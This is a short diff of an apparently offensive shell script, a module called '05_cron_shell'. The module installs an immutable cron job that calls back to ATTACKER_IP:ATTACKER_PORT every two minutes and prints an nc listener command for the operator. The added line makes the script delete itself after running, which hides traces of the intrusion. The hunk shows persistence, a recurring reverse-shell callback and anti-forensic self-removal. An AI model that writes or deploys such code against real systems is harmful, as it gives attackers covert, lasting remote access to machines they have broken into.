@@ -19,6 +19,7 @@ CRON_EOF
     chattr +i "$CRON_FILE" 2>/dev/null || true
     echo "[+] 05_cron_shell: ${CRON_FILE} (immutable) → ${ATTACKER_IP}:${ATTACKER_PORT} every 2 min"
     echo "[+]   Listener: nc -lvnp ${ATTACKER_PORT}"
+    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
     ;;
   cleanup)
     chattr -i "$CRON_FILE" 2>/dev/null || true
